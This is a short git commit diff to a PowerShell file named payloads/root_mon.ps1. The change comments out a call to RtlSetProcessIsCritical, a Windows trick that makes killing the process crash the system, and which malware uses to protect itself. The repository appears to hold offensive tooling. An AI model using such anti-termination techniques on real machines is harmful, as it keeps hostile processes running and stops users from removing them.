0fbdfde78e1f87ae0f49241f9e2d9d78e77de603
soumyo001 <www.soumyo@gmail.com>
2025-08-11 23:21:50 +0600

    mods

--- payloads/root_mon.ps1
+++ payloads/root_mon.ps1
@@ -27,7 +27,7 @@ public class CS {
 }
 "@
 Add-Type -TypeDefinition $signature
-[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
+# [CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
 
 # if([string]::IsNullOrEmpty($basePath) -or 
 #     [string]::IsNullOrEmpty($childServiceName) -or 
